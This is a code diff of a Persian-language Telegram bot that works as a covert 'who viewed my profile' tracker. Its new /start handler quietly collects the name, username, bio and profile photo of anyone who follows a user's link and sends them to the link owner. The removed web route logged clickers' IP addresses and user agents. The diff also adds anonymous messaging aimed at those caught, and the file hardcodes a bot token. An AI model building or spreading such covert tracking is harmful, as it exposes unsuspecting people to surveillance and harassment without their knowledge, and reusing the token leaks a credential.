@@ -10,6 +10,7 @@ import threading
 
 # ---------- تنظیمات اولیه ----------
 TOKEN = "8981742192:AAHC8z6u6GifXgMIafvzv0tn_Q2LV1mM2bQ"
+BOT_USERNAME = "nevergivup_bot"  # بدون @، مثلاً "my_tracker_bot"
 BASE_URL = "https://barcelona-l5tu.onrender.com"
 CHANNELS = ["@film01385"]
 CHANNEL_NAMES = {
@@ -35,6 +36,7 @@ c.execute("""CREATE TABLE IF NOT EXISTS users (
 c.execute("""CREATE TABLE IF NOT EXISTS clicks (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     link_code TEXT,
+    clicker_id INTEGER,
     ip TEXT,
     user_agent TEXT,
     timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
@@ -56,13 +58,13 @@ def get_ip():
 
 def generate_link(telegram_id):
     code = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
-    full_link = f"{BASE_URL}/track/{code}"
+    full_link = f"https://t.me/{BOT_USERNAME}?start=track_{code}"
     c.execute("INSERT OR REPLACE INTO users (telegram_id, link_code, link_full) VALUES (?, ?, ?)", 
               (telegram_id, code, full_link))
     conn.commit()
     return full_link
 
-def get_user_id_by_code(code):
+def get_owner_id_by_code(code):
     c.execute("SELECT telegram_id FROM users WHERE link_code = ?", (code,))
     result = c.fetchone()
     return result[0] if result else None
@@ -89,6 +91,50 @@ def save_user_settings(user_id, text=None, photo_id=None):
                   (user_id, text, photo_id))
     conn.commit()
 
+def get_clicker_info(clicker_id):
+    """دریافت اطلاعات کامل شخصی که روی لینک کلیک کرده"""
+    try:
+        chat = bot.get_chat(clicker_id)
+        user = chat
+        first_name = user.first_name or ""
+        last_name = user.last_name or ""
+        name = f"{first_name} {last_name}".strip()
+        username = f"@{user.username}" if user.username else "ندارد"
+        
+        # دریافت بیو (در صورت وجود)
+        bio = "ندارد"
+        try:
+            if hasattr(chat, 'bio') and chat.bio:
+                bio = chat.bio
+        except:
+            pass
+            
+        # دریافت عکس پروفایل
+        photo_file_id = None
+        try:
+            photos = bot.get_user_profile_photos(clicker_id, limit=1)
+            if photos.total_count > 0:
+                photo_file_id = photos.photos[0][-1].file_id
+        except:
+            pass
+            
+        return {
+            "name": name if name else "ناشناس",
+            "username": username,
+            "bio": bio,
+            "photo_id": photo_file_id,
+            "telegram_id": clicker_id
+        }
+    except Exception as e:
+        print(f"Error getting user info: {e}")
+        return {
+            "name": "ناشناس",
+            "username": "نامشخص",
+            "bio": "در دسترس نیست",
+            "photo_id": None,
+            "telegram_id": clicker_id
+        }
+
 # ---------- بررسی عضویت ----------
 def is_user_member(user_id):
     for channel in CHANNELS:
@@ -102,15 +148,13 @@ def is_user_member(user_id):
 
 # ---------- ایجاد Reply Keyboard (صفحه‌کلید دائمی) ----------
 def get_main_reply_keyboard():
-    """ساخت صفحه کلید دائمی با دکمه‌های شیشه‌ای"""
     keyboard = ReplyKeyboardMarkup(
-        row_width=2,  # تعداد دکمه در هر ردیف
-        resize_keyboard=True,  # اندازه کیبورد را با صفحه هماهنگ کن
-        one_time_keyboard=False,  # کیبورد پس از استفاده بسته نشود (دائمی)
-        input_field_placeholder="یک گزینه را انتخاب کنید..."  # متن راهنما در باکس ورودی
+        row_width=2,
+        resize_keyboard=True,
+        one_time_keyboard=False,
+        input_field_placeholder="یک گزینه را انتخاب کنید..."
     )
     
-    # ایجاد دکمه‌ها
     btn_get_link = KeyboardButton("🔗 دریافت لینک من")
     btn_buy_sub = KeyboardButton("💰 خرید اشتراک پرو")
     btn_buy_shield = KeyboardButton("🛡 خرید سپر")
@@ -118,52 +162,43 @@ def get_main_reply_keyboard():
     btn_set_text = KeyboardButton("✏️ تنظیم متن مچ‌گیری")
     btn_help = KeyboardButton("📖 راهنما")
     
-    # چیدمان دکمه‌ها در کیبورد
     keyboard.add(btn_get_link, btn_buy_sub)
     keyboard.add(btn_buy_shield, btn_set_photo)
     keyboard.add(btn_set_text, btn_help)
     
     return keyboard
 
-# ---------- نمایش پنل کاربری با Reply Keyboard ----------
+# ---------- نمایش پنل کاربری ----------
 def show_panel(chat_id, message_id=None):
-    # ساخت Inline Keyboard برای عملیات خاص (مثل کپی، مخفی کردن و...)
-    # توجه: Reply Keyboard قبلاً ارسال شده، اینجا فقط در صورت نیاز از Inline استفاده می‌کنیم
     text = "👋 به پنل کاربری خود خوش آمدید.\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:"
+    reply_keyboard = get_main_reply_keyboard()
     
     if message_id:
-        # اگر در حال ادیت یک پیام هستیم، فقط متن را ادیت می‌کنیم (Reply Keyboard قبلاً وجود دارد)
         bot.edit_message_text(text, chat_id, message_id)
+        bot.send_message(chat_id, "کیبورد در پایین صفحه فعال است.", reply_markup=reply_keyboard)
     else:
-        # ارسال پیام جدید همراه با Reply Keyboard
-        reply_keyboard = get_main_reply_keyboard()
         bot.send_message(chat_id, text, reply_markup=reply_keyboard)
 
-# ---------- هندلر جدید برای مدیریت دکمه‌های Reply Keyboard ----------
+# ---------- هندلر دکمه‌های Reply Keyboard ----------
 @bot.message_handler(func=lambda message: True)
 def handle_reply_buttons(message):
-    """هندلر تمام پیام‌های متنی - برای تشخیص دکمه‌های Reply Keyboard"""
     user_id = message.from_user.id
     chat_id = message.chat.id
     text = message.text
     
-    # بررسی اینکه کاربر عضو کانال هست یا نه
     if not is_user_member(user_id):
-        # اگر عضو نیست، درخواست عضویت بده
         keyboard = InlineKeyboardMarkup(row_width=1)
         for channel in CHANNELS:
             display_name = CHANNEL_NAMES.get(channel, channel)
             keyboard.add(InlineKeyboardButton(f"🔹 {display_name}", url=f"https://t.me/{channel[1:]}"))
         keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
-        bot.reply_to(message, "👋 برای استفاده از ربات ابتدا در کانال های زیر عضو شوید:", reply_markup=keyboard, parse_mode='Markdown')
+        bot.reply_to(message, "👋 برای استفاده از ربات ابتدا در کانال های زیر عضو شوید:", reply_markup=keyboard)
         return
     
-    # پردازش دکمه‌های Reply Keyboard
     if text == "🔗 دریافت لینک من":
         link = generate_link(user_id)
-        link_code = link.split('/')[-1]
+        link_code = link.split('_')[-1]
         
-        # ساخت Inline Keyboard برای عملیات لینک
         inline_keyboard = InlineKeyboardMarkup(row_width=2)
         inline_keyboard.add(
             InlineKeyboardButton("📋 کپی لینک من", callback_data=f"copy_{link_code}"),
@@ -173,7 +208,8 @@ def handle_reply_buttons(message):
         msg = bot.send_message(
             chat_id,
             f"🔗 **لینک اختصاصی شما:**\n\n"
-            f"`{link}`",
+            f"`{link}`\n\n"
+            f"⚠️ این لینک را در بیوگرافی خود قرار دهید تا ببینید چه کسانی پروفایل شما را می‌بینند.",
             reply_markup=inline_keyboard,
             parse_mode='Markdown'
         )
@@ -212,10 +248,8 @@ def handle_reply_buttons(message):
             "**۱. نحوه کارکرد ربات (سیستم مچ‌گیری):**\n"
             "شما می‌توانید با دریافت لینک اختصاصی خود از طریق ربات و قرار دادن آن در بخش بیوگرافی (Bio) "
             "حساب کاربری‌تان، متوجه شوید چه کسانی در حال بازدید از پروفایل شما هستند.\n\n"
-            "به محض اینکه شخصی از روی کنجکاوی روی لینک شما کلیک کرده و وارد ربات شود، "
-            "ربات فوراً پیامی با مضمون «یک فضول در تله افتاد!» برای شما ارسال می‌کند. "
-            "این گزارش شامل اطلاعات کامل شخص است:\n"
-            "▫️ نام کاربر\n▫️ آیدی (لینک ورود به پیوی)\n▫️ عکس پروفایل\n▫️ بیوگرافی (در صورت وجود)\n\n"
+            "به محض اینکه شخصی روی لینک شما کلیک کند، ربات اطلاعات کامل او را برای شما ارسال می‌کند:\n"
+            "▫️ نام و نام خانوادگی\n▫️ آیدی (لینک ورود به پیوی)\n▫️ بیوگرافی\n▫️ عکس پروفایل\n\n"
             "**۲. اشتراک ویژه (پرو - ۳۰ روزه):**\n"
             "با تهیه اشتراک پرو، امکانات پیشرفته زیر در اختیار شما قرار می‌گیرد:\n"
             "🔹 **ارسال پیام ناشناس:** می‌توانید از طریق ربات، برای شخصی که در تله شما افتاده است به صورت کاملاً ناشناس پیام ارسال کنید.\n"
@@ -235,35 +269,91 @@ def handle_reply_buttons(message):
         bot.send_message(chat_id, help_text, parse_mode='Markdown')
     
     else:
-        # اگر پیام متنی معمولی بود که با دکمه‌ها مطابقت ندارد
         bot.send_message(chat_id, "❌ لطفاً از دکمه‌های زیر استفاده کنید.", reply_markup=get_main_reply_keyboard())
 
 # ---------- هندلر دستور start ----------
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
+    text = message.text
+    
+    # بررسی اگر کاربر با لینک اختصاصی وارد شده باشد
+    if text.startswith("/start track_"):
+        code = text.split("track_")[1]
+        owner_id = get_owner_id_by_code(code)
+        clicker_id = user_id
+        
+        if owner_id and owner_id != clicker_id:
+            # ذخیره کلیک در دیتابیس
+            ip_address = "N/A"
+            user_agent = "N/A"
+            c.execute("INSERT INTO clicks (link_code, clicker_id, ip, user_agent) VALUES (?, ?, ?, ?)", 
+                      (code, clicker_id, ip_address, user_agent))
+            conn.commit()
+            
+            # دریافت اطلاعات کلیک‌کننده
+            clicker_info = get_clicker_info(clicker_id)
+            capture_text = get_user_capture_text(owner_id)
+            capture_photo = get_user_capture_photo(owner_id)
+            
+            # ساخت پیام برای صاحب لینک
+            report_text = (
+                f"🔔 **بازدید جدید!**\n\n"
+                f"👤 **نام:** {clicker_info['name']}\n"
+                f"🆔 **آیدی:** {clicker_info['username']}\n"
+                f"📝 **بیو:** {clicker_info['bio']}\n"
+                f"⏰ **زمان:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                f"🎯 {capture_text}"
+            )
+            
+            # دکمه ارسال پیام ناشناس
+            keyboard = InlineKeyboardMarkup()
+            keyboard.add(InlineKeyboardButton("📩 ارسال پیام ناشناس", callback_data=f"msg_{clicker_id}"))
+            
+            # ارسال گزارش به صاحب لینک
+            try:
+                if capture_photo:
+                    bot.send_photo(owner_id, capture_photo, caption=report_text, reply_markup=keyboard, parse_mode='Markdown')
+                else:
+                    bot.send_message(owner_id, report_text, reply_markup=keyboard, parse_mode='Markdown')
+                
+                # پیام خوشامد به شخص کلیک‌کننده
+                bot.send_message(clicker_id, "✅ شما با موفقیت وارد ربات شدید!")
+            except Exception as e:
+                print(f"Error sending report: {e}")
+        else:
+            # اگر شخص روی لینک خودش کلیک کرده
+            if owner_id == clicker_id:
+                bot.send_message(clicker_id, "⚠️ شما روی لینک خودتان کلیک کردید! این بازدید گزارش نمی‌شود.")
+            else:
+                bot.send_message(clicker_id, "❌ لینک نامعتبر است!")
+        
+        # نمایش پنل به کاربر (چه صاحب لینک باشد چه کلیک‌کننده)
+        if is_user_member(user_id):
+            show_panel(message.chat.id)
+        else:
+            # درخواست عضویت در کانال
+            keyboard = InlineKeyboardMarkup(row_width=1)
+            for channel in CHANNELS:
+                display_name = CHANNEL_NAMES.get(channel, channel)
+                keyboard.add(InlineKeyboardButton(f"🔹 {display_name}", url=f"https://t.me/{channel[1:]}"))
+            keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
+            bot.reply_to(message, "👋 برای استفاده از ربات ابتدا در کانال های زیر عضو شوید:", reply_markup=keyboard)
+        
+        return
+    
+    # start معمولی (بدون کد)
     if is_user_member(user_id):
         show_panel(message.chat.id)
     else:
         keyboard = InlineKeyboardMarkup(row_width=1)
-        
         for channel in CHANNELS:
             display_name = CHANNEL_NAMES.get(channel, channel)
-            keyboard.add(InlineKeyboardButton(
-                f"🔹 {display_name}", 
-                url=f"https://t.me/{channel[1:]}"
-            ))
-        
+            keyboard.add(InlineKeyboardButton(f"🔹 {display_name}", url=f"https://t.me/{channel[1:]}"))
         keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
-        
-        bot.reply_to(
-            message,
-            "👋 **برای استفاده از ربات ابتدا در کانال های زیر عضو شوید :**",
-            reply_markup=keyboard,
-            parse_mode='Markdown'
-        )
+        bot.reply_to(message, "👋 برای استفاده از ربات ابتدا در کانال های زیر عضو شوید:", reply_markup=keyboard)
 
-# ---------- هندلر دکمه‌های Inline (شیشه‌ای داخل پیام) ----------
+# ---------- هندلر دکمه‌های Inline ----------
 @bot.callback_query_handler(func=lambda call: True)
 def handle_buttons(call):
     user_id = call.from_user.id
@@ -278,16 +368,32 @@ def handle_buttons(call):
     
     elif call.data.startswith("copy_"):
         link_code = call.data.split("_")[1]
-        link = f"{BASE_URL}/track/{link_code}"
+        link = f"https://t.me/{BOT_USERNAME}?start=track_{link_code}"
         bot.send_message(chat_id, f"🔗 لینک اختصاصی شما برای کپی:\n\n`{link}`", parse_mode='Markdown')
         bot.answer_callback_query(call.id, "✅ لینک برای کپی ارسال شد!")
     
     elif call.data == "hide_link":
-        bot.edit_message_text(
-            "🔗 لینک شما مخفی شد. برای دریافت مجدد لینک، از پنل اصلی اقدام کنید.",
-            chat_id, call.message.message_id
-        )
+        bot.edit_message_text("🔗 لینک شما مخفی شد. برای دریافت مجدد لینک، از پنل اصلی اقدام کنید.", chat_id, call.message.message_id)
         threading.Timer(2.0, lambda: show_panel(chat_id)).start()
+    
+    elif call.data.startswith("msg_"):
+        target_id = int(call.data.split("_")[1])
+        # ذخیره موقت target_id برای کاربر جاری
+        bot.send_message(chat_id, "✍️ **پیام ناشناس خود را بنویسید:**\n(فقط متن قابل ارسال است)", parse_mode='Markdown')
+        bot.register_next_step_handler_by_chat_id(chat_id, lambda m: send_anonymous_message(m, target_id))
+        bot.answer_callback_query(call.id)
+
+# ---------- ارسال پیام ناشناس ----------
+def send_anonymous_message(message, target_id):
+    sender_id = message.from_user.id
+    if message.text:
+        try:
+            bot.send_message(target_id, f"📩 **پیام ناشناس:**\n\n{message.text}", parse_mode='Markdown')
+            bot.send_message(sender_id, "✅ پیام شما **ناشناس** ارسال شد.", parse_mode='Markdown')
+        except Exception as e:
+            bot.send_message(sender_id, f"❌ خطا در ارسال پیام: {e}")
+    else:
+        bot.send_message(sender_id, "❌ لطفاً فقط متن ارسال کنید.")
 
 # ---------- دریافت متن مچ‌گیری ----------
 def receive_capture_text(message):
@@ -324,52 +430,6 @@ def webhook():
     except Exception as e:
         print(f"Webhook error: {e}")
         return jsonify({"status": "error"}), 500
-
-@app.route('/track/<code>')
-def track_click(code):
-    user_a_id = get_user_id_by_code(code)
-    ip_address = get_ip()
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    c.execute("INSERT INTO clicks (link_code, ip, user_agent) VALUES (?, ?, ?)", 
-              (code, ip_address, user_agent))
-    conn.commit()
-    
-    if user_a_id and user_a_id in user_link_messages:
-        msg_info = user_link_messages[user_a_id]
-        try:
-            capture_text = get_user_capture_text(user_a_id)
-            bot.edit_message_text(
-                f"🔗 لینک اختصاصی شما:\n\n"
-                f"`{msg_info['link_code']}`\n\n"
-                f"🎯 **{capture_text}**\n"
-                f"📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-                msg_info["chat_id"], msg_info["message_id"],
-                parse_mode='Markdown'
-            )
-        except Exception as e:
-            print(f"Error updating message: {e}")
-    
-    if user_a_id:
-        try:
-            capture_text = get_user_capture_text(user_a_id)
-            capture_photo = get_user_capture_photo(user_a_id)
-            
-            if capture_photo:
-                bot.send_photo(
-                    user_a_id,
-                    capture_photo,
-                    caption=f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
-                )
-            else:
-                bot.send_message(
-                    user_a_id,
-                    f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
-                )
-        except Exception as e:
-            print(f"Error sending to {user_a_id}: {e}")
-    
-    return redirect("https://t.me/your_channel", code=302)
 
 @app.route('/health', methods=['GET'])
 def health():
